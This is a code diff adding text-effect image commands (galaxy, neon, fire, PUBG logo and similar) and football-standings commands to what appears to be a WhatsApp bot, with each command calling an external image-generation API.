+case "galaxywallpaper": {
+    let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}galaxywallpaper Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in galaxywallpaper command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "makingneon": {
+    let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}makingneon Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in makingneon command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+case "matrix": {
+    let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}matrix Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/matrix-text-effect-154.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in matrix command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case"royaltext": {
+let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}royaltext Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/royal-text-effect-online-free-471.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in royaltext command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "sand": {
+    let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}sand Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in sand command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "summerbeach": {
+    let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}summerbeach Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in summerbeach command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "typography": {
+    let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}typography Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in typography command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "luxurygold": {
+let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}luxurygold Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in luxurygold command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "glossysilver": {
+const text = args.join(" ");
+        if (!text) return reply(`*Example: ${prefix}glossysilver Kevin*`);
+        
+        try {
+            await reply("✨ Creating glossy silver text effect... Please wait ⏳");
+            
+            const axios = require('axios');
+            const apiUrl = `https://api.princetechn.com/api/ephoto360/glossysilver?apikey=prince&text=${encodeURIComponent(text)}`;
+            
+            const response = await axios.get(apiUrl);
+            
+            if (response.data && response.data.success && response.data.result && response.data.result.image_url) {
+                await conn.sendMessage(m.chat, {
+                    image: { url: response.data.result.image_url },
+                    caption: `> ${global.wm}`
+                }, { quoted: m });
+            } else {
+                reply("Failed to generate glossy silver text. Please try again.");
+            }
+        } catch (error) {
+            console.error("Error in glossysilver command:", error);
+            reply("Error generating glossy silver text. Please try again later.");
+        }
+}
+break
+case "bear":
+case "bearlogo":
+case "beartext": {
+  if (!text) return reply(`*Example: ${prefix}firetext Kevin*`);
+
+    try {
+        await reply(`🐻 *Creating bear logo for:* ${q}\n⏳ Please wait...`);
+        
+        const apiUrl = `https://api.nexray.eu.cc/textpro/bear?text=${encodeURIComponent(text)}`;
+        
+        const response = await axios.get(apiUrl, {
+            responseType: 'arraybuffer',
+            timeout: 20000
+        });
+
+        await conn.sendMessage(m.chat, {
+            image: Buffer.from(response.data),
+            caption: `> ${global.wm}`
+        }, { quoted: m });
+        
+        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+
+    } catch (error) {
+        console.error("Error in bear command:", error);
+        reply("*❌ An error occurred while generating the bear logo.*\nPlease try again later.");
+    }
+    
+}
+break
+case "comic":
+case "comiclogo":
+case "comictext": {
+    if (!text) return reply(`*🎭 COMIC LOGO MAKER*\n\n*Example:* ${prefix}comic Kevin\n*Example:* ${prefix}comiclogo Jexploit`);
+
+    try {
+        await reply(`🎭 *Creating comic logo for:* ${text}\n⏳ Please wait...`);
+        
+        const apiUrl = `https://api.nexray.eu.cc/textpro/comic?text=${encodeURIComponent(text)}`;
+        
+        const response = await axios.get(apiUrl, {
+            responseType: 'arraybuffer',
+            timeout: 20000
+        });
+
+        await conn.sendMessage(m.chat, {
+            image: Buffer.from(response.data),
+            caption: `> ${global.wm}`
+        }, { quoted: m });
+        
+        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+
+    } catch (error) {
+        console.error("Error in comic command:", error);
+        reply("*❌ An error occurred while generating the comic logo.*\nPlease try again later.");
+    }
+    break;
+}
+
+case "devilwings":
+case "devil":
+case "devilwingstext": {
+    if (!text) return reply(`*👿 DEVIL WINGS LOGO MAKER*\n\n*Example:* ${prefix}devilwings Kevin\n*Example:* ${prefix}devil Jexploit`);
+
+    try {
+        await reply(`👿 *Creating devil wings logo for:* ${text}\n⏳ Please wait...`);
+        
+        const apiUrl = `https://api.nexray.eu.cc/textpro/devil-wings?text=${encodeURIComponent(text)}`;
+        
+        const response = await axios.get(apiUrl, {
+            responseType: 'arraybuffer',
+            timeout: 20000
+        });
+
+        await conn.sendMessage(m.chat, {
+            image: Buffer.from(response.data),
+            caption: `> ${global.wm}`
+        }, { quoted: m });
+        
+        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+
+    } catch (error) {
+        console.error("Error in devilwings command:", error);
+        reply("*❌ An error occurred while generating the devil wings logo.*\nPlease try again later.");
+    }
+    break;
+}
+
+case "wolfgalaxy":
+case "wolf":
+case "wolfgalaxytext": {
+    if (!text) return reply(`*🐺 WOLF GALAXY LOGO MAKER*\n\n*Usage:* ${prefix}wolfgalaxy Lance|Kev\n*Example:* ${prefix}wolfgalaxy Kevin|Tech\n\n_Use | to separate first and second text_`);
+
+    // Split text by | for two text inputs
+    const texts = text.split('|');
+    const text1 = texts[0]?.trim() || '';
+    const text2 = texts[1]?.trim() || text1;
+
+    if (!text1) {
+        return reply(`*🐺 WOLF GALAXY LOGO MAKER*\n\n*Usage:* ${prefix}wolfgalaxy Lance|Kev\n*Example:* ${prefix}wolfgalaxy Kevin|Tech`);
+    }
+
+    try {
+        await reply(`🐺 *Creating wolf galaxy logo for:* ${text1} & ${text2}\n⏳ Please wait...`);
+        
+        const apiUrl = `https://api.nexray.eu.cc/textpro/wolf-galaxy?text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`;
+        
+        const response = await axios.get(apiUrl, {
+            responseType: 'arraybuffer',
+            timeout: 20000
+        });
+
+        await conn.sendMessage(m.chat, {
+            image: Buffer.from(response.data),
+            caption: `> ${global.wm}`
+        }, { quoted: m });
+        
+        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+
+    } catch (error) {
+        console.error("Error in wolfgalaxy command:", error);
+        reply("*❌ An error occurred while generating the wolf galaxy logo.*\nPlease try again later.");
+    }
+    
+}
+break
+case 'firetext':
+case 'fire':
+case 'firetxt': {
+    if (!text) return reply(`*Example: ${prefix}firetext Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/fireText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        // ✅ Updated response handling
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate fire text.`);
+        }
+    } catch (error) {
+        console.error('Fire text error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+}
+break
+case 'neontext':
+case 'neon':
+case 'neontxt': {
+    const text = args.join(" ");
+    if (!text) return reply(`*Example: ${prefix}neontext Kelvin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/neonText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate neon text.`);
+        }
+    } catch (error) {
+        console.error('Neon text error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    
+}
+break
+case 'metaltext':
+case 'metallic':
+case 'metallictxt': {
+    const text = args.join(" ");
+    if (!text) return reply(`*Example: ${prefix}metaltext Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/metallicText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate metallic text.`);
+        }
+    } catch (error) {
+        console.error('Metallic text error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    break;
+}
+case 'snowtext':
+case 'snow':
+case 'snowtxt': {
+    const text = args.join(" ");
+    if (!text) return reply(`*Example: ${prefix}snowtext Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/snowText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate snow text.`);
+        }
+    } catch (error) {
+        console.error('Snow text error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    break;
+}
+case 'icetext':
+case 'ice':
+case 'icetxt': {
+    const text = args.join(" ");
+    if (!text) return reply(`*Example: ${prefix}icetext Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/iceText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate ice text.`);
+        }
+    } catch (error) {
+        console.error('Ice text error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    
+}
+break
+case 'purpletext':
+case 'purple':
+case 'purpletxt': {
+    const text = args.join(" ");
+    if (!text) return reply(`*Example: ${prefix}purpletext Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/purpleText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate purple text.`);
+        }
+    } catch (error) {
+        console.error('Purple text error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    break;
+}
+case 'lighttext':
+case 'light':
+case 'lighttxt': {
+    const text = args.join(" ");
+    if (!text) return reply(`*Example: ${prefix}lighttext Kelvin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/lightText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate light text.`);
+        }
+    } catch (error) {
+        console.error('Light text error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    break;
+}
+case 'thundertext':
+case 'thunder':
+case 'thundertxt': {
+    const text = args.join(" ");
+    if (!text) return reply(`*Example: ${prefix}thundertext Kelvin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/thunderText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate thunder text.`);
+        }
+    } catch (error) {
+        console.error('Thunder text error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    break;
+}
+case 'leavestext':
+case 'leaves':
+case 'leavestxt': {
+    const text = args.join(" ");
+    if (!text) return reply(`*Example: ${prefix}leavestext Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/leavesText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate leaves text.`);
+        }
+    } catch (error) {
+        console.error('Leaves text error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    
+}
+break
+case 'hackertext':
+case 'hacker':
+case 'hackertxt': {
+    const text = args.join(" ");
+    if (!text) return reply(`*Example: ${prefix}hackertext Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/hackerText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate hacker text.`);
+        }
+    } catch (error) {
+        console.error('Hacker text error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    break;
+}
+case 'deviltext':
+case 'devil':
+case 'deviltxt': {
+    const text = args.join(" ");
+    if (!text) return reply(`*Example: ${prefix}deviltext Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/devilText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate devil text.`);
+        }
+    } catch (error) {
+        console.error('Devil text error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    break;
+}
+case 'vintagetext':
+case 'vintage':
+case 'vintagetxt': {
+    const text = args.join(" ");
+    if (!text) return reply(`*Example: ${prefix}vintagetext Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/vintageText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate vintage text.`);
+        }
+    } catch (error) {
+        console.error('Vintage text error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    break;
+}
+case 'wingslogo':
+case 'wings':
+case 'wingslog': {
+    const text = args.join(" ");
+    if (!text) return reply(`Example: ${prefix}wingslogo Kevin`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/wingsLogo?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate wings logo.`);
+        }
+    } catch (error) {
+        console.error('Wings logo error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    break;
+}
+case 'painttext':
+case 'paint':
+case 'painttxt': {
+    const text = args.join(" ");
+    if (!text) return reply(`*Example: ${prefix}painttext Kelvin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/paintText?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate paint text.`);
+        }
+    } catch (error) {
+        console.error('Paint text error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    
+}
+case 'naruto': {
+    if (!text) return reply(`*Example: ${prefix}naruto Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/naruto?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate Naruto effect.`);
+        }
+    } catch (error) {
+        console.error('Naruto error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    
+}
+break
+case 'pubg':
+case 'pubglogo': {
+    if (!text) return reply(`*Example: ${prefix}pubglogo Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/pubgLogo?apikey=${global.KevinApi}&name=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            const resultUrl = response.data.data.image_url;
+            
+            // Check if it's a video (MP4) or image
+            if (resultUrl.endsWith('.mp4')) {
+                await conn.sendMessage(m.chat, {
+                    video: { url: resultUrl },
+                    caption: `> ${global.wm}`
+                }, { quoted: m });
+            } else {
+                await conn.sendMessage(m.chat, {
+                    image: { url: resultUrl },
+                    caption: `> ${global.wm}`
+                }, { quoted: m });
+            }
+        } else {
+            reply(`Failed to generate PUBG Logo effect.`);
+        }
+    } catch (error) {
+        console.error('PUBG Logo error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    
+}
+break
+// ===== New Malvin ephoto360 commands =====
+case 'blueneonlogo':
+case 'blueneon': {
+    if (!text) return reply(`*Example: ${prefix}blueneonlogo Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/blueNeonLogo?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate blue neon logo.`);
+        }
+    } catch (error) {
+        console.error('Blue neon logo error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+}
+break
+case 'dotaavatar':
+case 'dota': {
+    if (!text) return reply(`*Example: ${prefix}dotaavatar Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/dotaAvatar?apikey=${global.KevinApi}&name=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate Dota avatar.`);
+        }
+    } catch (error) {
+        console.error('Dota avatar error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+}
+break
+case 'dragonball809':
+case 'dbz': {
+    if (!text) return reply(`*Example: ${prefix}dragonball809 Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/dragonBall809?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate Dragon Ball text.`);
+        }
+    } catch (error) {
+        console.error('Dragon Ball 809 error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+}
+break
+case 'galaxycover': {
+    if (!text) return reply(`*Example: ${prefix}galaxycover Kelvin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/galaxyCover?apikey=${global.KevinApi}&name=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate galaxy cover.`);
+        }
+    } catch (error) {
+        console.error('Galaxy cover error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+}
+break
+case 'galaxyneon': {
+    if (!text) return reply(`*Example: ${prefix}galaxyneon Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/galaxyNeon?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate galaxy neon text.`);
+        }
+    } catch (error) {
+        console.error('Galaxy neon error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+}
+break
+case 'lolavatar':
+case 'lol': {
+    if (!text) return reply(`*Example: ${prefix}lolavatar Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/lolAvatar?apikey=${global.KevinApi}&name=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate LoL avatar.`);
+        }
+    } catch (error) {
+        console.error('LoL avatar error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+}
+break
+case 'neonsignature':
+case 'signature': {
+    if (!text) return reply(`*Example: ${prefix}neonsignature Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/neonSignature?apikey=${global.KevinApi}&signature=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate neon signature.`);
+        }
+    } catch (error) {
+        console.error('Neon signature error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+}
+break
+case 'retroneon':
+case 'retro': {
+    if (!text) return reply(`*Example: ${prefix}retroneon Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/retroNeon?apikey=${global.KevinApi}&text=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate retro neon text.`);
+        }
+    } catch (error) {
+        console.error('Retro neon error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+}
+break
+case 'rovwallpaper':
+case 'rov': {
+    if (!text) return reply(`*Example: ${prefix}rovwallpaper Kevin*`);
+
+    try {
+        const apiUrl = `${global.wow}ephoto360/rovWallpaper?apikey=${global.KevinApi}&name=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (response.data?.status === true && response.data?.data?.image_url) {
+            await conn.sendMessage(m.chat, {
+                image: { url: response.data.data.image_url },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } else {
+            reply(`Failed to generate ROV wallpaper.`);
+        }
+    } catch (error) {
+        console.error('ROV wallpaper error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+}
+break
+case "underwater": {
+const text = args.join(" ");
+        if (!text) return reply(`*Example: ${prefix}underwater Kevin*`);
+        
+        try {
+            await reply("Creating underwater text effect... Please wait");
+            
+            const axios = require('axios');
+            const apiUrl = `https://api.princetechn.com/api/ephoto360/underwater?apikey=prince&text=${encodeURIComponent(text)}`;
+            
+            const response = await axios.get(apiUrl);
+            
+            if (response.data && response.data.success && response.data.result && response.data.result.image_url) {
+                await conn.sendMessage(m.chat, {
+                    image: { url: response.data.result.image_url },
+                    caption: `> ${global.wm}`
+                }, { quoted: m });
+            } else {
+                reply("Failed to generate underwater text. Please try again.");
+            }
+        } catch (error) {
+            console.error("Error in underwater command:", error);
+            reply("Error generating underwater text. Please try again later.");
+        }
+}
+break
+case "1917style": {
+let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}1917style Kelvin*`);
+    }
+
+    const link = "https://en.ephoto360.com/1917-style-text-effect-523.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in 1917style command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "multicoloredneon": {
+let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}multicoloredneon Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in multicoloredneon command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "dragonball": {
+let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}dragonball Kelvin*`);
+    }
+
+    const link = "https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in dragonball command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "pixelglitch": {
+let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}pixelglitch Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in pixelglitch command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+case "corntext": {
+const text = args.join(" ");
+        if (!text) return reply(`*Example: ${prefix}corntext Kelvin*`);
+        
+        try {
+            await reply("🌽 Creating corn kernels text effect... Please wait ⏳");
+            
+            const apiUrl = `https://api.siputzx.my.id/api/m/textpro?url=https://textpro.me/create-artistic-3d-text-effects-from-corn-kernels-1177.html&text=${encodeURIComponent(text)}`;
+            
+            await conn.sendMessage(m.chat, {
+                image: { url: apiUrl },
+                caption: `> ${global.wm}`
+            }, { quoted: m });
+        } catch (error) {
+            console.error("Error in corntext command:", error);
+            reply("Error generating effect. Please try again.");
+        }
+}
+break
+case 'eplstandings':
+case 'plstandings':
+case 'premierleaguestandings':
+    await sports.formatStandings('PL', 'Premier League', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'clstandings':
+case 'championsleague':
+    await sports.formatStandings('CL', 'UEFA Champions League', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'laligastandings':
+case 'laliga':
+    await sports.formatStandings('PD', 'La Liga', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'bundesligastandings':
+case 'bundesliga':
+    await sports.formatStandings('BL1', 'Bundesliga', { m, reply });
+    await sendPTT(conn, m.chat, getRandomAudio(), m);
+    break;
+    
+case 'serieastandings':
+case 'seriea':
